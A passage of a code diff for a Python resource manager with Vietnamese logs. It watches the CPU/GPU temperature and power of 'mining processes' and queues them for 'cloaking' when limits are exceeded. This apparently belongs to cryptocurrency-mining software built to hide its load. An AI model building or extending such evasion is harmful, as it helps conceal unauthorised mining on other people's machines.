-                self.logger.warning(f"Nhiệt độ GPU {gpu_temps}°C > {gpu_max_temp}°C (PID={process.pid}).")
+            if any(t > gpu_max_temp for t in g_temps):
+                self.logger.warning(f"Nhiệt độ GPU {g_temps}°C > {gpu_max_temp}°C (PID={process.pid}).")
                 await self.enqueue_cloaking(process)
-
         except Exception as e:
-            self.logger.error(f"check_temperature_and_enqueue error PID={process.pid}: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"check_temperature_and_enqueue PID={process.pid}: {e}\n{traceback.format_exc()}")
 
     async def power_watcher(self):
         """
-        Watcher giám sát công suất CPU/GPU. Nếu vượt ngưỡng => enqueue cloaking.
+        Giám sát công suất CPU/GPU => enqueue_cloaking nếu vượt.
         """
         mon_params = self.config.monitoring_parameters
         power_intv = mon_params.get("power_monitoring_interval_seconds", 60)
@@ -731,107 +624,99 @@ class ResourceManager(IResourceManager):
         cpu_max_pwr = per_dev_power.get("cpu", 150)
         gpu_max_pwr = per_dev_power.get("gpu", 300)
 
-        consecutive_errors = 0  # Đếm số lỗi liên tiếp
-
+        consecutive_errors = 0
         while not self.stop_event.is_set():
             try:
                 await self.discover_mining_processes_async()
 
-                # Retry logic khi không acquire được lock
                 acquired = False
                 for _ in range(3):
                     async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
-                        if read_lock is not None:
+                        if read_lock:
                             acquired = True
                             break
                         else:
-                            self.logger.warning("Retrying lock mining_processes trong power_watcher...")
+                            self.logger.warning("Retrying lock => power_watcher...")
                             await asyncio.sleep(1)
 
                 if not acquired:
-                    self.logger.error("Timeout khi lock mining_processes trong power_watcher sau 3 lần thử.")
+                    self.logger.error("Timeout lock => power_watcher (3 lần).")
                     continue
 
-                tasks = [
-                    self.check_power_and_enqueue(proc, cpu_max_pwr, gpu_max_pwr)
-                    for proc in self.mining_processes
-                ]
-
+                tasks = [self.check_power_and_enqueue(p, cpu_max_pwr, gpu_max_pwr)
+                         for p in self.mining_processes]
                 results = await asyncio.gather(*tasks, return_exceptions=True)
-                for result in results:
-                    if isinstance(result, Exception):
-                        self.logger.error(f"Lỗi trong task check_power_and_enqueue: {result}")
+                for r in results:
+                    if isinstance(r, Exception):
+                        self.logger.error(f"Lỗi check_power_and_enqueue: {r}")
 
                 consecutive_errors = 0
-
             except asyncio.CancelledError:
                 self.logger.info("Watcher bị hủy (power_watcher).")
                 break
             except Exception as e:
                 consecutive_errors += 1
                 self.logger.error(f"Lỗi power_watcher: {e}\n{traceback.format_exc()}")
-
                 if consecutive_errors >= 5:
-                    self.logger.critical("Lỗi liên tiếp trong power_watcher, tạm dừng 60 giây.")
+                    self.logger.critical("Lỗi liên tiếp power_watcher => ngủ 60s.")
                     await asyncio.sleep(60)
-
             await asyncio.sleep(power_intv)
 
     async def check_power_and_enqueue(self, process: MiningProcess, cpu_max_power: int, gpu_max_power: int):
         try:
-            c_power = await asyncio.get_event_loop().run_in_executor(None, get_cpu_power, process.pid)
-            g_power = await asyncio.get_event_loop().run_in_executor(None, get_gpu_power, process.pid)
+            loop = asyncio.get_event_loop()
+            c_power = await loop.run_in_executor(None, get_cpu_power, process.pid)
+            g_power = await loop.run_in_executor(None, get_gpu_power, process.pid)
 
-            # Xử lý GPU power (nếu là list)
             if isinstance(g_power, list):
                 total_g_power = sum(g_power)
                 if total_g_power > gpu_max_power:
-                    self.logger.warning(f"GPU power={total_g_power}W > {gpu_max_power}W (PID={process.pid}).")
+                    self.logger.warning(f"GPU={total_g_power}W > {gpu_max_power}W => cloak (PID={process.pid}).")
                     await self.enqueue_cloaking(process)
-            elif g_power > gpu_max_power:
-                self.logger.warning(f"GPU power={g_power}W > {gpu_max_power}W (PID={process.pid}).")
+            elif g_power and g_power > gpu_max_power:
+                self.logger.warning(f"GPU={g_power}W > {gpu_max_power}W => cloak (PID={process.pid}).")
                 await self.enqueue_cloaking(process)
 
-            if c_power > cpu_max_power:
-                self.logger.warning(f"CPU power={c_power}W > {cpu_max_power}W (PID={process.pid}).")
+            if c_power and c_power > cpu_max_power:
+                self.logger.warning(f"CPU={c_power}W > {cpu_max_power}W => cloak (PID={process.pid}).")
                 await self.enqueue_cloaking(process)
-
         except Exception as e:
-            self.logger.error(f"check_power_and_enqueue error PID={process.pid}: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"check_power_and_enqueue PID={process.pid}: {e}\n{traceback.format_exc()}")
 
     ##########################################################################
-    #               KHỞI TẠO WATCHERS & DỪNG ResourceManager                 #
+    #                      START WATCHERS & SHUTDOWN                          #
     ##########################################################################
     async def start_watchers(self):
-        """Khởi tạo watchers & queue consumer dưới dạng asyncio Task."""
-        self.logger.debug("ResourceManager.start_watchers: Khởi tạo các watcher tasks.")
+        self.logger.debug("ResourceManager.start_watchers: Tạo watchers tasks.")
         try:
             self.watchers.append(asyncio.create_task(self.temperature_watcher()))
             self.watchers.append(asyncio.create_task(self.power_watcher()))
             self.watchers.append(asyncio.create_task(self.process_resource_adjustments()))
-            self.logger.info("Đã khởi tạo watchers (temperature, power) và consumer hàng đợi.")
+            self.logger.info("Đã khởi tạo watchers (temperature, power) + queue consumer.")
         except Exception as e:
-            self.logger.error(f"Lỗi khi khởi tạo watchers: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi start_watchers: {e}\n{traceback.format_exc()}")
             raise
 
     async def shutdown(self):
         """
-        Dừng ResourceManager và giải phóng tài nguyên.
+        Dừng ResourceManager => hủy watchers => shutdown NVML => restore resources => done
         """
         self.logger.info("Dừng ResourceManager... (BẮT ĐẦU)")
         self.stop_event.set()
 
-        # Hủy các watchers
+        # Cancel watchers
         for w in self.watchers:
             w.cancel()
         await asyncio.gather(*self.watchers, return_exceptions=True)
 
-        # Đợi queue rỗng
+        # Chờ queue trống
         await asyncio.sleep(1)
+
+        # Tắt NVML
         if self.shared_resource_manager:
             await self.shared_resource_manager.shutdown_nvml()
 
-        # Khôi phục tài nguyên cho tất cả tiến trình (nếu cần)
+        # Restore resources => lock read => restore all
         if self.shared_resource_manager:
             tasks = []
             async with acquire_lock_with_timeout(self.mining_processes_lock, 'read', 5) as read_lock:
@@ -841,4 +726,3 @@ class ResourceManager(IResourceManager):
             await asyncio.gather(*tasks, return_exceptions=True)
 
         self.logger.info("ResourceManager đã dừng. (KẾT THÚC)")
-
